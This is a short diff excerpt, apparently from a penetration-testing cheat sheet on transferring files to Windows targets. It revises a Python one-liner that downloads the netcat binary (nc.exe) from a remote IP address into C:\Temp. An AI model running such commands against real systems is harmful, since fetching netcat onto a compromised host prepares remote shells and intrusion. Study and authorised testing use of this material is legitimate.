@@ -332,7 +332,7 @@ ftp -s:ftp-commands.txt
 
 ##### Python
 ```python
-python -c "import urllib; print urllib.urlopen('http://10.11.0.245/nc.exe').read()" > C:\Temp\nc.exe
+python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
 ```
 
 ##### HTTP: Powershell
